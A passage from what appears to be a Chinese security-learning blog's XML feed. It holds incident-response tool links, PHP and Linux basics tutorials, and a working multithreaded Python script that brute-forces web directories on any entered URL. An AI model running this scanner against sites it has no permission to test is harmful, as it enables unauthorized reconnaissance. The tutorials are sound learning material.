href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h3 id="10-2-病毒查杀"><a href="#10-2-病毒查杀" class="headerlink" title="10.2 病毒查杀"></a>10.2 病毒查杀</h3><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a> （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h3 id="10-3-病毒动态"><a href="#10-3-病毒动态" class="headerlink" title="10.3 病毒动态"></a>10.3 病毒动态</h3><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h3 id="10-4-在线病毒扫描网站"><a href="#10-4-在线病毒扫描网站" class="headerlink" title="10.4 在线病毒扫描网站"></a>10.4 在线病毒扫描网站</h3><p><a href="http://www.virscan.org/">http://www.virscan.org</a> &#x2F;&#x2F;多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎</p><p><a href="https://habo.qq.com/">https://habo.qq.com</a> &#x2F;&#x2F;腾讯哈勃分析系统</p><p><a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a> &#x2F;&#x2F;Jotti恶意软件扫描系统</p><p><a href="http://www.scanvir.com/">http://www.scanvir.com</a> &#x2F;&#x2F;针对计算机病毒、手机病毒、可疑文件等进行检测分析</p><h3 id="10-5-webshell查杀"><a href="#10-5-webshell查杀" class="headerlink" title="10.5 webshell查杀"></a>10.5 webshell查杀</h3><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马webshell查杀：<a href="http://www.shellpub.com/">http://www.shellpub.com</a></p><p>深信服Webshell网站后门检测工具：<a href="http://edr.sangfor.com.cn/backdoor_detection.html">http://edr.sangfor.com.cn/backdoor_detection.html</a></p><p>Safe3：<a href="http://www.uusec.com/webshell.zip">http://www.uusec.com/webshell.zip</a></p>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
      <tag>Windows应急</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP基础学习二</title>
    <link href="/2023/08/15/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%BA%8C/"/>
    <url>/2023/08/15/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP基础学习二"><a href="#PHP基础学习二" class="headerlink" title="PHP基础学习二"></a>PHP基础学习二</h1><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP基础学习一</title>
    <link href="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/"/>
    <url>/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP基础学习一"><a href="#PHP基础学习一" class="headerlink" title="PHP基础学习一"></a>PHP基础学习一</h1><span id="more"></span><h2 id="一、php基础语法"><a href="#一、php基础语法" class="headerlink" title="一、php基础语法"></a>一、php基础语法</h2><p>php代码可放置于文档中的任何位置</p><p>PHP 代码以 <em><?php* 开头，以 *?></em> 结尾，同时php代码可以嵌入到html代码当中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;<br>    &lt;title&gt;PHP&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello world!&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/image-20230805104259969.png" alt="image-20230805104259969"></p><h2 id="二、注释"><a href="#二、注释" class="headerlink" title="二、注释"></a>二、注释</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/*内容*/</span>   多行注释<br><span class="hljs-comment">//单行注释</span><br></code></pre></td></tr></table></figure><h2 id="三、变量"><a href="#三、变量" class="headerlink" title="三、变量"></a>三、变量</h2><h3 id="3-1-变量的声明"><a href="#3-1-变量的声明" class="headerlink" title="3.1 变量的声明"></a>3.1 变量的声明</h3><p>php的特性之一就是它并不要求在使用变量之前声明变量，当第一次给一个变量赋值时，才创建了这个变量，用于存储数字、文本字符串、数组等。一旦设置了某个变量，我们就可以在脚本中重复的使用。</p><p>php中变量必须使用【**$**+变量名】来表示</p><h3 id="3-2-变量的销毁"><a href="#3-2-变量的销毁" class="headerlink" title="3.2 变量的销毁"></a>3.2 变量的销毁</h3><p><span style="color:red;background:背景颜色;font-size:文字大小;font-family:字体;">unset()</span></p><h3 id="3-3-变量的命名"><a href="#3-3-变量的命名" class="headerlink" title="3.3 变量的命名"></a>3.3 变量的命名</h3><ul><li>严格区分大小写</li><li>变量名由字母或者下划线开头，不可使用数字开头</li><li>不要使用一些关键字作为变量名称</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;小二&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-4-变量的赋值"><a href="#3-4-变量的赋值" class="headerlink" title="3.4 变量的赋值"></a>3.4 变量的赋值</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-number">1000</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<span class="hljs-comment">//1000    </span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<span class="hljs-comment">//1000</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>相当于把<code>$a</code>的值复制一份再赋值给<code>$b</code></p><h3 id="3-5-变量的类型"><a href="#3-5-变量的类型" class="headerlink" title="3.5 变量的类型"></a>3.5 变量的类型</h3><p>变量类型是指保存在该变量中的数据类型。在php中不需要声明变量类型</p><p>使用<code>var_dump()</code>可以输出变量的类型</p><ul><li><p>bool：true&#x2F;fasle</p></li><li><p>int：整数</p></li><li><p>float：浮点</p></li><li><p>string：字符串</p><ul><li><p>用双引号，单引号，定界符</p></li><li><p>在字符串中，变量不会被解析，如果需要被解析，使用<code>&#123;变量&#125;</code></p></li><li><pre><code class="php">&lt;?php$b = &quot;大白&quot;;$a = &quot;dksadjsak&#123;$b&#125;&quot;;echo $a;?&gt;//dksadjsak大白    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- &lt;&lt;&lt;：定界符，<span class="hljs-number">1</span>处的字符串要和<span class="hljs-number">2</span>处的一致；定界符中可以包含单引号，双引号以及变量。<br><br>  ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$b</span> = <span class="hljs-number">123</span>;<br>  <span class="hljs-variable">$a</span> = &lt;&lt;&lt;www<span class="hljs-comment">//1</span><br>  hello world <span class="hljs-variable">$b</span><br>  www;<span class="hljs-comment">//2</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>  <span class="hljs-meta">?&gt;</span><br>  <span class="hljs-comment">//hello world 123</span><br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h2 id="四、常量"><a href="#四、常量" class="headerlink" title="四、常量"></a>四、常量</h2><p>相当于存储数据的容器：<span style="color:red;background:背景颜色;font-size:文字大小;font-family:字体;">define(‘常量名称’,常量值)</span>，按照惯例常量全部为大写：</p><ul><li>defined()函数用来检查是否定义了某个常量</li><li>常量只能用define()来定义</li><li>常量前面没有$符</li><li>预定义常量(php内核已经定义好的常量，且不区分大小写)<ul><li><img src="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/image-20230805144957203.png" alt="image-20230805144957203"></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;MY_NAME&#x27;</span>,<span class="hljs-string">&#x27;张三&#x27;</span>);<br><span class="hljs-keyword">echo</span> MY_NAME;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="五、运算符"><a href="#五、运算符" class="headerlink" title="五、运算符"></a>五、运算符</h2><h3 id="5-1-算术运算符"><a href="#5-1-算术运算符" class="headerlink" title="5.1 算术运算符"></a>5.1 算术运算符</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">+</span> - * /<br></code></pre></td></tr></table></figure><p><img src="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/image-20230815151421698.png" alt="image-20230815151421698"></p><h3 id="5-2-字符串运算符"><a href="#5-2-字符串运算符" class="headerlink" title="5.2 字符串运算符"></a>5.2 字符串运算符</h3><p>小数点：<span style="color:red;background:背景颜色;font-size:文字大小;font-family:字体;">.</span> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">. 用来连接字符串<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Azzml&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;blog&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/08/05/PHP%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B8%80/image-20230815152808156.png" alt="image-20230815152808156"></p><h3 id="5-3-比较运算符"><a href="#5-3-比较运算符" class="headerlink" title="5.3 比较运算符"></a>5.3 比较运算符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">==：值是否相等，若相等为<span class="hljs-literal">true</span>，若不等则为<span class="hljs-literal">false</span><br>===：全等(值要相等，类型也要相等)，若相等为<span class="hljs-literal">true</span>，若不等则为<span class="hljs-literal">false</span><br>!=：值是否不相等，若不相等为<span class="hljs-literal">true</span>，若相等则为<span class="hljs-literal">false</span><br>&lt;&gt;：值是否不相等，若不相等为<span class="hljs-literal">true</span>，若相等则为<span class="hljs-literal">false</span>    <br>!==：值和类型不全等则为<span class="hljs-literal">true</span>，若两边全等为<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h3 id="5-4-逻辑运算符"><a href="#5-4-逻辑运算符" class="headerlink" title="5.4 逻辑运算符"></a>5.4 逻辑运算符</h3><ul><li>与：and 或者&amp;&amp;，左右两边表达式的值均为true，最终的结果才为true，其他情况均为false</li><li>或：or 或者||，左右两边表达式的值只要有一个是true，结果就为true，两边值均为false时，结果才为false</li><li>异或：xor，左右两边表达式的值不一样时，结果为true，若一样，则结果为false</li><li>非：！，将原来表达式的值取反，true转为false，false转为true</li></ul><h3 id="5-5-位运算符"><a href="#5-5-位运算符" class="headerlink" title="5.5 位运算符"></a>5.5 位运算符</h3>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python目录扫描脚本</title>
    <link href="/2023/08/04/Python%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/"/>
    <url>/2023/08/04/Python%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>Python目录扫描</p><ul><li>输入目标Url和线程大小</li><li>以队列的形式从字典中获取要爆破的路径</li><li>定义路径获取函数get_path()</li><li>利用多线程进行url目录爆破</li><li>定义目录爆破函数get_url()</li></ul><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment">#定义路径获取函数get_path()</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_path</span>(<span class="hljs-params">url,file=<span class="hljs-string">&quot;dict.txt&quot;</span></span>):<span class="hljs-comment">#注意：字典放在和脚本同一目录下即可</span><br>    path_queue = queue.Queue()<br>    f = <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>        path = url + i.strip()<br>        path_queue.put(path)<br>    f.close()<br>    <span class="hljs-keyword">return</span> path_queue<br><br><span class="hljs-comment">#定义目录爆破函数get_url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_url</span>(<span class="hljs-params">path_queue</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> path_queue.empty():<br>        <span class="hljs-keyword">try</span>:<br>            url = path_queue.get()<br>            http = urllib3.PoolManager()<span class="hljs-comment">#1个PoolManager实例来生成请求, 由该实例对象处理与线程池的连接以及线程安全的所有细节</span><br>            response = http.request(<span class="hljs-string">&#x27;GET&#x27;</span>,url)<br>            <span class="hljs-keyword">if</span> response.status == <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[%d] =&gt; %s&quot;</span> % (response.status,url))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        sys.exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">url,threadNum</span>):<br>    path_queue = get_path(url)<br><br>    threads = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(threadNum):<br>        t = threading.Thread(target=get_url,args=(path_queue,))<br>        threads.append(t)<br>        t.start()<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    start = time.time()<br>    url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter an url:&quot;</span>)<br>    threadnum = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter threads:&quot;</span>))<br>    main(url,threadnum)<br>    end = time.time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总共耗时%.2f&quot;</span>%(end-start))<br><br>  <br>    <br></code></pre></td></tr></table></figure><p><img src="/2023/08/04/Python%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/image-20230804152914817.png" alt="image-20230804152914817"></p>]]></content>
    
    
    <categories>
      
      <category>Python脚本</category>
      
    </categories>
    
    
    <tags>
      
      <tag>目录扫描</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux基础</title>
    <link href="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/08/01/Linux%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>系统目录：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livescript">├── bin -&gt; usr/bin <span class="hljs-comment"># 用于存放二进制命令</span><br>├── boot <span class="hljs-comment"># 内核及引导系统程序所在的目录</span><br>├── dev <span class="hljs-comment"># 所有设备文件的目录（如磁盘、光驱等）</span><br>├── etc <span class="hljs-comment"># 配置文件默认路径、服务启动命令存放目录</span><br>├── home <span class="hljs-comment"># 用户家目录，root用户为/root</span><br>├── lib -&gt; usr/lib <span class="hljs-comment"># 32位库文件存放目录</span><br>├── lib64 -&gt; usr/lib64 <span class="hljs-comment"># 64位库文件存放目录</span><br>├── media <span class="hljs-comment"># 媒体文件存放目录</span><br>├── mnt <span class="hljs-comment"># 临时挂载设备目录</span><br>├── opt <span class="hljs-comment"># 自定义软件安装存放目录</span><br>├── proc <span class="hljs-comment"># 进程及内核信息存放目录</span><br>├── root <span class="hljs-comment"># Root用户家目录</span><br>├── run <span class="hljs-comment"># 系统运行时产生临时文件，存放目录</span><br>├── sbin -&gt; usr/sbin <span class="hljs-comment"># 系统管理命令存放目录</span><br>├── srv <span class="hljs-comment"># 服务启动之后需要访问的数据目录</span><br>├── sys <span class="hljs-comment"># 系统使用目录</span><br>├── tmp <span class="hljs-comment"># 临时文件目录</span><br>├── usr <span class="hljs-comment"># 系统命令和帮助文件目录</span><br>└── <span class="hljs-keyword">var</span> <span class="hljs-comment"># 存放内容易变的文件的目录</span><br><br></code></pre></td></tr></table></figure><h2 id="一、目录操作"><a href="#一、目录操作" class="headerlink" title="一、目录操作"></a>一、目录操作</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">pwd</span>查看当前工作目录<br><span class="hljs-keyword">clear</span>清除屏幕<br><span class="hljs-keyword">cd</span> ~当前用户目录<br><span class="hljs-keyword">cd</span> /根目录<br><span class="hljs-keyword">cd</span> -上一次访问的目录<br><span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>返回上一级目录<br></code></pre></td></tr></table></figure><h3 id="1-1-查看目录内信息"><a href="#1-1-查看目录内信息" class="headerlink" title="1.1 查看目录内信息"></a>1.1 查看目录内信息</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ls</span>仅罗列出当前文件名或目录名<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">a</span> 列出目录下所有文件，包括以.开头的隐含文件<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span>列出文件的详细信息<br><span class="hljs-keyword">ll</span>同<span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span><br></code></pre></td></tr></table></figure><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/1.png"></p><h3 id="1-2-创建目录"><a href="#1-2-创建目录" class="headerlink" title="1.2 创建目录"></a>1.2 创建目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir aaa在当前目录下创建aaa目录，相对路径<br>mkdir ./bbb在当前目录下创建bbb目录，相对路径<br>mkdir /ccc在根目录下创建ccc目录，绝对路径<br></code></pre></td></tr></table></figure><h3 id="1-3-搜素命令"><a href="#1-3-搜素命令" class="headerlink" title="1.3 搜素命令"></a>1.3 搜素命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name &#x27;b&#x27;查询根目录下（包括子目录），名以b的目录和文件；<br>find / -name &#x27;b*&#x27;查询根目录下（包括子目录），名以b开头的目录和文件； <br>find . -name &#x27;b&#x27;查询当前目录下（包括子目录），名以b的目录和文件；<br></code></pre></td></tr></table></figure><h3 id="1-4-重命名"><a href="#1-4-重命名" class="headerlink" title="1.4 重命名"></a>1.4 <strong>重命名</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv 原先目录 文件的名称 <br>mv tomcat001 tomcat <br></code></pre></td></tr></table></figure><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/2.png" alt="image-20230801103408344"></p><h3 id="1-5-剪切命令"><a href="#1-5-剪切命令" class="headerlink" title="1.5 剪切命令"></a>1.5 剪切命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv/aaa /bbb    将根目录下的aaa目录，移动到bbb目录下(假如没有bbb目录，则重命名为bbb)；<br>mvbbbb usr/bbb将当前目录下的bbbb目录，移动到usr目录下，并且修改名称为bbb；<br>mvbbbb usr/aaa将当前目录下的bbbb目录，移动到usr目录下，并且修改名称为aaa；<br></code></pre></td></tr></table></figure><h3 id="1-6-复制目录"><a href="#1-6-复制目录" class="headerlink" title="1.6 复制目录"></a>1.6 <strong>复制目录</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp -r /aaaa /bbb将/目录下的aaa目录复制到/bbb目录下，在/bbb目录下的名称为aaa<br>cp -r aaaa/ nps/a将当前目录下的aaaa目录复制到/bbb目录下，且修改名为a;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/3.png" alt="image-20230801104552930"></p><h3 id="1-7-强制删除指定目录"><a href="#1-7-强制删除指定目录" class="headerlink" title="1.7 强制删除指定目录"></a>1.7 强制删除指定目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm -rf /bbb<br></code></pre></td></tr></table></figure><h2 id="二、账户和权限"><a href="#二、账户和权限" class="headerlink" title="二、账户和权限"></a>二、账户和权限</h2><h3 id="2-1-查看主机相关信息"><a href="#2-1-查看主机相关信息" class="headerlink" title="2.1 查看主机相关信息"></a>2.1 查看主机相关信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">uname查看系统相关信息<br>-a：显示主机名、内核版本、硬件平台等详细信息<br>-r：显示内核版本号、<br><br>hostname查看主机名<br><br></code></pre></td></tr></table></figure><h3 id="2-2-用户账户"><a href="#2-2-用户账户" class="headerlink" title="2.2  用户账户"></a>2.2  用户账户</h3><p>根据拥有的权限不同，可以分为三种账户</p><ul><li>超级用户：root用户是Linux操作系统中默认的超级用户账号，对本主机拥有最高的权限。系统中超级用户是唯一 的。</li><li>普通用户：由root用户或其他管理员用户创建，拥有的权限会受到限制，一般只在用户自己的宿主目录中拥有完整权限。</li><li>程序用户：在安装Linux操作系统及部分应用程序时，会添加一些特定的低权限用户账号，这些用户一般不允许登录到系统，仅用于维持系统或某个程序的正常运行，如bin. daemon、ftp、 mail等。</li></ul><h3 id="2-3-组账号"><a href="#2-3-组账号" class="headerlink" title="2.3 组账号"></a>2.3 组账号</h3><ul><li>基本组（私有组）：基本组账号只有一个，一般为创建用户时指定的组，在etc&#x2F;passwd文件中第4字段记录的即为该用户的基本组GID号</li><li>附加组（公共组）：用户除了基本组以外，额外添加指定的组</li></ul><h3 id="2-4-UID和GID"><a href="#2-4-UID和GID" class="headerlink" title="2.4 UID和GID"></a>2.4 UID和GID</h3><ul><li>UID：用户标识号</li><li>GID：组标识号</li><li>一般情况下root账户的UID和GID都为固定值0</li><li>UID：取值范围是0-65535。0是超级用户root的标识号，1-99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。</li></ul><h3 id="2-5-用户帐号文件"><a href="#2-5-用户帐号文件" class="headerlink" title="2.5 用户帐号文件"></a>2.5 用户帐号文件</h3><p>&#x2F;etc&#x2F;passwd：</p><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/4.png" alt="image-20230801143120603"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">用户名:用户密码占位符<span class="hljs-string">&#x27;X&#x27;</span>:UID:GID:注释性描述:主目录:登录shell信息(<span class="hljs-regexp">/bin/</span>bash为可登陆系统，<span class="hljs-regexp">/sbin/</span> nologin和<span class="hljs-regexp">/bin/</span> <span class="hljs-keyword">false</span>为禁止用户登陆系统)<br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;shadow：真正的加密后的用户口令字存放到&#x2F;etc&#x2F;shadow</p><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/5.png" alt="image-20230801143157717"></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span 